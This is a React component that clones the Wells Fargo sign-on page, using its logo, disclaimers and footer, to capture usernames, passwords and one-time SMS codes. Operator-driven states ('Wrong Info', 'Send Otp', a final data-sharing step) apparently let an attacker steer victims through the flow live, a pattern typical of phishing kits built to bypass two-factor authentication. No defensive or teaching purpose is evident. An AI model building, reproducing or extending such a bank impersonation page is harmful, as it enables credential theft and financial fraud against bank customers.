import { navDetails, otpOptions } from "../../bankDetails";
import { Link } from "react-router-dom";
import Greetings from "../../../../firstSection/Greetings";
import { IoCloseCircleOutline, IoSearchOutline } from "react-icons/io5";
import { FaArrowRightLong } from "react-icons/fa6";
import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import WellsFargoFavIco from "../../../../../../../../assets/allBanks/banks/wellsfargo/wf1.ico";
import { TbLockPassword } from "react-icons/tb";
import WellsFargoLogo from "../../../../../../../../assets/allBanks/banks/wellsfargo/wf3.webp";
import { BsExclamationCircleFill } from "react-icons/bs";
import { CgClose } from "react-icons/cg";
import { useState } from "react";
import { AiOutlineClose } from "react-icons/ai";
import { VscMenu } from "react-icons/vsc";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const WellsFargo = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    handleChange,
    onSubmitOtp,
    blurOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
    setFormState,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);
  const [openMenu, setOpenMenu] = useState(false);

  const hanldeMenuBar = () => {
    setOpenMenu((prevToggle) => !prevToggle);
  };

  const handleClearUsers = () => {
    setFormState({
      username: "",
    });
  };

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  customXlg:btn7 bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign on to view your personnel accounts | Wells Fargo"
        handleCancel={handleCancel}
        img={WellsFargoFavIco}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />

      <header
        className={clsx(
          "relative flex items-center justify-between w-full p-4  text-white border-b-4 bg-customRed-400 border-customYellow-100",
          openMenu ? " " : "overflow-hidden"
        )}
      >
        <div className="customMiniTablet:hidden"></div>
        <div>
          <img
            src={WellsFargoLogo}
            alt=""
            className="w-[145px] h-[16px] customMiniTablet:w-full customMiniTablet:h-full"
          />
        </div>
        <div className=" customXlg:hidden" onClick={hanldeMenuBar}>
          {openMenu ? <AiOutlineClose size={30} /> : <VscMenu size={30} />}
        </div>

        <div
          className={clsx(
            "absolute left-0 w-full min-h-screen  bg-black top-full bg-opacity-45 customXlg:hidden text-black flex justify-end ",
            openMenu
              ? "translate-x-0 transistion1 "
              : "translate-x-full transistion2"
          )}
        >
          <div className="bg-white customMiniTablet:h-[30%] customMiniTablet:w-[30%] h-[60%] w-[60%] p-3">
            <nav>
              <Link
                to="https://www.wellsfargo.com/"
                className="block space-y-5"
              >
                <div className="flex gap-1">
                  <TbLockPassword size={21} />

                  <p>Enroll</p>
                </div>
                {navDetails.map((nav) => (
                  <p key={nav.id}>{nav.name}</p>
                ))}
              </Link>
            </nav>
          </div>
        </div>

        <div className="hidden  items-center gap-2.5 customXlg:flex">
          <nav>
            <Link
              to="https://www.wellsfargo.com/"
              className="flex items-center gap-2.5"
            >
              <div className="flex gap-1">
                <TbLockPassword size={21} />

                <p>Enroll</p>
              </div>
              {navDetails.map((nav) => (
                <p key={nav.id}>{nav.name}</p>
              ))}
            </Link>
          </nav>
          <div className="relative">
            <input
              type="text"
              placeholder="Search"
              className="w-32 py-2 pl-2 pr-10 text-black rounded-xl"
            />
            <IoSearchOutline className="absolute top-0 h-full text-2xl leading-6 text-black right-3 " />
          </div>
        </div>
      </header>
      <div
        className={clsx(
          "px-4 customMiniTablet:px-16 py-7",
          allBankOpen ? "hidden" : "block"
        )}
      >
        <div className="flex flex-col items-center justify-center w-full pt-5 pb-16 bg-white rounded-xl">
          <h3 className="text-[34px] mb-3">
            <Greetings />
          </h3>
          <div>
            <div>
              <div
                className={clsx(
                  "flex items-center py-2 pr-4 mb-3 border rounded-2xl border-customGray-1017",
                  formState.username &&
                    "border-customPurple-400 border-2 transistion2"
                )}
              >
                <input
                  type="text"
                  placeholder="Username"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  className="w-full py-2 pl-4 bg-transparent outline-none placeholder:text-lg placeholder:text-customGray-1017"
                />
                <IoCloseCircleOutline
                  size={25}
                  className="mb-0"
                  onClick={handleClearUsers}
                />
              </div>
              <div
                className={clsx(
                  "flex items-center py-2 pr-4 mb-6 border rounded-2xl border-customGray-1017 ",
                  formState.password &&
                    "border-customPurple-400 border-2 transistion2"
                )}
              >
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  placeholder="Password"
                  className="w-full py-2 pl-4 pr-2 bg-transparent outline-none placeholder:text-lg placeholder:text-customGray-1017 "
                />
                <span
                  onClick={() => setshowPassword((prevShow) => !prevShow)}
                  className="text-[15px] font-semibold underline text-customPurple-400"
                >
                  {showPassword ? "Hide" : "Show"}
                </span>
              </div>
              <div className="px-3  w-full customMiniTablet:w-[328px] space-y-3 ">
                <div className="flex items-center gap-2">
                  <input type="checkbox" className="w-[20px] h-[20px]" />
                  <p className="text-customGray-1020 ">Save username</p>
                </div>
                <p className="text-[13px] ">
                  To help your account secure, save your username only on
                  devices that aren&apos;t used by other people
                </p>
              </div>
              <div className="flex justify-center my-8">
                <button
                  className={clsx(
                    "px-10 text-[17px] py-2 rounded-2xl bg-customGray-1018 text-customGray-1019",
                    formState.username &&
                      formState.password &&
                      "bg-customRed-400 hover:bg-customRed-500 hover:underline text-white transistion2"
                  )}
                  onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                >
                  {loading && <ClipLoader size={10} color="#b5adad" />}
                  {loading ? "Loading..." : "Sign On"}
                </button>
              </div>
              <Link
                to="https://www.wellsfargo.com/"
                className="flex items-center justify-center gap-3 text-[15px] text-customPurple-300"
              >
                <FaArrowRightLong size={12} />
                Forgot username or password?
              </Link>
            </div>
          </div>
        </div>
        <div className="p-0 text-lg bg-white rounded-lg customMiniTablet:p-5 text-customGray-1020 mt-11 mb-7">
          <div className="p-4 mb-8 space-y-3 font-bold border border-customGray-1021">
            <h1>Investment and Insurance Products are:</h1>
            <ul className="px-3 space-y-3 [list-style-type:square]">
              <li>Not Insured by the FDIC or Any Federal Government Agency</li>
              <li>
                Not a Deposit or Other Obligation of, or Guaranteed by, the Bank
                or Any Bank Affiliate
              </li>
              <li>
                Subject to Investment Risks, Including Possible Loss of the
                Principal Amount Invested
              </li>
            </ul>
          </div>
          <p>Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</p>
        </div>
      </div>
      {allBankOpen && (
        <div className={clsx(OtpOpen ? "hidden" : "block")}>
          <BankControl
            handleSelectedId={handleSelectedId}
            selectedPath={selectedPath}
            handleSelectSubmit={handleSelectSubmit}
          />
          <div>
            {activePathDetails.name === "Loading" && (
              <p className="my-5 font-extrabold text-center text-customRed-200">
                <BasicLoader />
              </p>
            )}
            {activePathDetails.name === "Wrong Info" && (
              <>
                <div className={clsx("px-4 customMiniTablet:px-16 py-7")}>
                  <div className="flex flex-col items-center justify-center w-full pt-5 pb-16 bg-white rounded-xl">
                    <h3 className="text-[34px] mb-3">
                      <Greetings />
                    </h3>
                    <div>
                      <div>
                        <div className="flex justify-center gap-3 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                          <BsExclamationCircleFill className="mt-[2px]" />

                          <p>{activePathDetails.body}</p>
                        </div>
                        <div
                          className={clsx(
                            "flex items-center py-2 pr-4 mb-3 border rounded-2xl border-customGray-1017",
                            formState.username &&
                              "border-customPurple-400 border-2 transistion2"
                          )}
                        >
                          <input
                            type="text"
                            placeholder="Username"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                            className="w-full py-2 pl-4 bg-transparent outline-none placeholder:text-lg placeholder:text-customGray-1017"
                          />
                          <IoCloseCircleOutline
                            size={25}
                            className="mb-0"
                            onClick={handleClearUsers}
                          />
                        </div>
                        <div
                          className={clsx(
                            "flex items-center py-2 pr-4 mb-6 border rounded-2xl border-customGray-1017 ",
                            formState.password &&
                              "border-customPurple-400 border-2 transistion2"
                          )}
                        >
                          <input
                            type={showPassword ? "text" : "password"}
                            value={formState.password}
                            name="password"
                            onChange={handleChange}
                            placeholder="Password"
                            className="w-full py-2 pl-4 pr-2 bg-transparent outline-none placeholder:text-lg placeholder:text-customGray-1017 "
                          />
                          <span
                            onClick={() =>
                              setshowPassword((prevShow) => !prevShow)
                            }
                            className="text-[15px] font-semibold underline text-customPurple-400"
                          >
                            {showPassword ? "Hide" : "Show"}
                          </span>
                        </div>
                        <div className="px-3  w-full customMiniTablet:w-[328px] space-y-3 ">
                          <div className="flex items-center gap-2">
                            <input
                              type="checkbox"
                              className="w-[20px] h-[20px]"
                            />
                            <p className="text-customGray-1020 ">
                              Save username
                            </p>
                          </div>
                          <p className="text-[13px] ">
                            To help your account secure, save your username only
                            on devices that aren&apos;t used by other people
                          </p>
                        </div>
                        <div className="flex justify-center my-8">
                          <button
                            className={clsx(
                              "px-10 text-[17px] py-2 rounded-2xl bg-customGray-1018 text-customGray-1019",
                              formState.username &&
                                formState.password &&
                                "bg-customRed-400 hover:bg-customRed-500 hover:underline text-white transistion2"
                            )}
                            onClick={(e) =>
                              handleTheMainSubmit(e, onSumbitForm)
                            }
                          >
                            {loading && (
                              <ClipLoader size={10} color="#b5adad" />
                            )}
                            {loading ? "Loading..." : "Sign On"}
                          </button>
                        </div>
                        <Link
                          to="https://www.wellsfargo.com/"
                          className="flex items-center justify-center gap-3 text-[15px] text-customPurple-300"
                        >
                          <FaArrowRightLong size={12} />
                          Forgot username or password?
                        </Link>
                      </div>
                    </div>
                  </div>
                  <div className="p-0 text-lg bg-white rounded-lg customMiniTablet:p-5 text-customGray-1020 mt-11 mb-7">
                    <div className="p-4 mb-8 space-y-3 font-bold border border-customGray-1021">
                      <h1>Investment and Insurance Products are:</h1>
                      <ul className="px-3 space-y-3 [list-style-type:square]">
                        <li>
                          Not Insured by the FDIC or Any Federal Government
                          Agency
                        </li>
                        <li>
                          Not a Deposit or Other Obligation of, or Guaranteed
                          by, the Bank or Any Bank Affiliate
                        </li>
                        <li>
                          Subject to Investment Risks, Including Possible Loss
                          of the Principal Amount Invested
                        </li>
                      </ul>
                    </div>
                    <p>
                      Deposit products offered by Wells Fargo Bank, N.A. Member
                      FDIC.
                    </p>
                  </div>
                </div>
              </>
            )}
            {activePathDetails.name === "Send Otp" && (
              <>
                <h3>{activePathDetails.body}</h3>
                <div
                  className={clsx(
                    " px-4 customMiniTablet:px-24 py-7",
                    isOpenOtp && "hidden"
                  )}
                >
                  <div className="pb-4 bg-white text-customGray-900">
                    <div>
                      <div className="flex items-center justify-between px-3 py-2 mb-2 text-lg border-b border-customGray-1020">
                        <h3>
                          For your security, let&apos;s make sure it&apos; you
                        </h3>
                        <CgClose
                          size={20}
                          onClick={() => setAllBankItems(false)}
                        />
                      </div>
                      <div className="">
                        <div className="px-3 mb-4 space-y-2 text-xs">
                          <p>We&apos;ll text you with a one-time code.</p>
                          <p>
                            By continuing, you agree that we can send you the
                            code using the option&apos;s you select.
                          </p>
                          <p>
                            Avilability may be affected by your mobile
                            carreir&apos;s coverage area. Your mobile
                            carreir&apos;s message and data rates may appply
                          </p>
                        </div>
                        <p className="px-3 pb-1 mb-2 text-xs border-b border-customGray-1020">
                          Select one
                        </p>
                        <div
                          role="radiogroup"
                          aria-label="Otp Options"
                          className="flex flex-col space-y-3 "
                        >
                          {otpOptions.map((bank) => (
                            <div
                              key={bank.id}
                              role="radio"
                              tabIndex={0}
                              onClick={() => handleOtpOption(bank.id)}
                              className="flex items-center gap-2.5 border-b border-customGray-1020 px-3 pb-2"
                            >
                              <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                <p
                                  className={clsx(
                                    "rounded-full w-[10px] h-[10px]  ",
                                    otpOptions[indexOtp]?.id === bank.id
                                      ? "bg-customBlue-500"
                                      : ""
                                  )}
                                ></p>
                              </div>
                              <h2
                                className={clsx(
                                  "text-sm font-semibold",
                                  otpOptions[indexOtp]?.id === bank.id
                                    ? "text-customBlue-500 hover:underline"
                                    : "hover:text-customBlue-700 hover:underline"
                                )}
                              >
                                {bank.name}
                              </h2>
                            </div>
                          ))}
                        </div>
                        <div className="flex justify-end px-3 mt-5">
                          <button
                            onClick={onSubmitOtpOptions}
                            className={clsx(
                              "px-10 text-[17px] py-2 rounded-2xl bg-customGray-1018 text-customGray-1019",
                              otpOptions[indexOtp]?.id &&
                                "bg-customRed-400 hover:bg-customRed-500 hover:underline text-white transistion2"
                            )}
                          >
                            Send Code
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                {isOpenOtp && (
                  <div className={clsx(" px-4 customMiniTablet:px-24 py-7")}>
                    <div className="pb-4 bg-white text-customGray-900">
                      <div>
                        <div className="flex items-center justify-between px-3 py-2 mb-2 text-lg border-b border-customGray-1020">
                          <h3>Enter code</h3>
                          <CgClose
                            size={20}
                            onClick={() => setIsOpenOtp(false)}
                          />
                        </div>
                        <div className="">
                          <div className="px-3 mb-4 space-y-2 text-xs">
                            <p>
                              Your code was sent to your phone by text message.{" "}
                              <span
                                className={clsx(
                                  "font-bold underline",
                                  !resend &&
                                    "font-extralight text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Get a new code
                              </span>
                            </p>
                          </div>
                          <div className="mx-3 border-b pb-7 customMiniTablet:pr-80 border-customGray-1020">
                            <input
                              type="number"
                              placeholder="Code"
                              value={formOtp.otpo}
                              name="otpo"
                              onChange={changeOtp}
                              onBlur={blurOtp}
                              className={clsx(
                                "w-full pb-2 pl-3 border-b outline-none placeholder:text-lg no-spinner border-customGray-400",
                                errorOtp.otpo && "border-customRed-200 border-b"
                              )}
                            />
                            {errorOtp.otpo && (
                              <p className="mt-2 text-sm text-customRed-200">
                                Please enter the code.
                              </p>
                            )}
                          </div>
                          <div className="flex justify-end px-3 mt-5">
                            <button
                              className={clsx(
                                "px-10 text-[17px] py-2 rounded-2xl bg-customGray-1018 text-customGray-1019",
                                formOtp.otpo &&
                                  "bg-customRed-400 hover:bg-customRed-500 hover:underline text-white transistion2"
                              )}
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                            >
                              {loading && (
                                <ClipLoader size={10} color="#b5adad" />
                              )}
                              {loading ? "Loading..." : "Continue"}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      )}
      {OtpOpen && (
        <>
          <BankOtpControl
            handleSelectedOtp={handleSelectedOtp}
            selectedOtp={selectedOtp}
            handleSubmitOtp={handleSubmitOtp}
          />

          <div>
            {activeOtp.name === "Loading" && (
              <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                <BasicLoader />
              </p>
            )}
            {activeOtp.name === "wrong" && (
              <>
                <div className={clsx("px-4 customMiniTablet:px-24 py-7")}>
                  <div className="pb-4 bg-white text-customGray-900">
                    <div>
                      <div className="flex items-center justify-between px-3 py-2 mb-2 text-lg border-b border-customGray-1020">
                        <h3>Enter code</h3>
                        <CgClose
                          size={20}
                          onClick={() => setIsOpenOtp(false)}
                        />
                      </div>
                      <div className="">
                        <div className="px-3 mb-4 space-y-2 text-xs">
                          <p>
                            Your code was sent to your phone by text message.{" "}
                            <span className="font-bold underline">
                              Get a new code
                            </span>
                          </p>
                        </div>
                        <div className="mx-3 border-b pb-7 customMiniTablet:pr-80 border-customGray-1020">
                          <input
                            type="number"
                            placeholder="Code"
                            value={formOtp.otpo}
                            name="otpo"
                            onChange={changeOtp}
                            onBlur={blurOtp}
                            className={clsx(
                              "w-full pb-2 pl-3 border-b outline-none placeholder:text-lg no-spinner border-customGray-400",
                              errorOtp.otpo && "border-customRed-200 border-b"
                            )}
                          />
                          {errorOtp.otpo && (
                            <p className="mt-2 text-sm text-customRed-200">
                              Please enter the code.
                            </p>
                          )}
                          <h3 className="mt-2 text-sm text-customRed-200">
                            {activeOtp.body}
                          </h3>
                        </div>
                        <div className="flex justify-end px-3 mt-5">
                          <button
                            className={clsx(
                              "px-10 text-[17px] py-2 rounded-2xl bg-customGray-1018 text-customGray-1019",
                              formOtp.otpo &&
                                "bg-customRed-400 hover:bg-customRed-500 hover:underline text-white transistion2"
                            )}
                            onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                          >
                            {loading && (
                              <ClipLoader size={10} color="#b5adad" />
                            )}
                            {loading ? "Loading..." : "Continue"}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </>
            )}
            {activeOtp.name === "otp" && (
              <>
                <ShareData
                  bankName={bankName}
                  handleTheFinal={handleTheFinal}
                  handleCancel={handleCancel}
                  setIsOpenOtp={setIsOpenOtp}
                  setAllBankItems={setAllBankItems}
                  siteLink="https://www.wellsfargo.com/"
                />
              </>
            )}
          </div>
        </>
      )}
      <footer className="px-4 pt-6 pb-4 space-y-5 bg-customGray-1022 text-customGray-1020">
        <Link to="https://www.wellsfargo.com/" className="space-y-6">
          <span className="pr-4 my-5 border-r border-customGray-600">
            About Wells Fargo
          </span>
          <span className="px-4 my-5 border-l border-r border-customGray-600">
            Online Access Agreement
          </span>
          <span className="px-4 my-5 border-l border-r border-customGray-600">
            Privacy, Cookies, Security & Legal
          </span>
          <span className="px-4 my-5 border-l border-r border-customGray-600">
            Do not sell or share my personal information
          </span>
          <span className="px-4 my-5 border-l border-r border-customGray-600">
            Report Email Fraud
          </span>
          <span className="px-4 my-5 border-l border-r border-customGray-600">
            Security Center
          </span>
          <span className="px-4 my-5 border-l border-r border-customGray-600">
            Sitemap
          </span>
          <span className="px-4 my-5 border-l border-customGray-600">
            Give Us Feedback
          </span>
        </Link>
        <p>© 1999 - 2025 Wells Fargo. All rights reserved. NMLSR ID 399801</p>
      </footer>
    </motion.div>
  );
};

export default WellsFargo;
